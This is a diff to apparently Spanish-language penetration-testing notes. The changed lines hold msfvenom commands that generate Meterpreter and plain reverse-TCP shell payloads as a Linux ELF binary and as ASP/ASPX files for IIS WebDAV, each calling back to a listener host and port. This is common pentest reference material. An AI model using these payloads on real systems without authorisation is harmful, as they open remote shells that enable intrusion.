@@ -31,7 +31,7 @@ Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un s
 
 ### Linux Meterpreter
 
-```python 
+```bash 
 # Esto funciona cuando tenemos el usuario y passwd de un usuario normal
 
 ❯ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f elf > hola.elf
@@ -60,11 +60,12 @@ Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un s
 	# o = Exportar como 
 ```
 
-## WebDAV
+## IIS - WebDAV
 
 ```bash 
-# Al payload le llamaremos shell.asp
 ❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.68.1 LPORT=1234 -f asp > shell.asp
 	# p = payload 
 	# f = formato
+
+❯ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.68.1 LPORT=1234 -f asp > shell.aspx
 ```
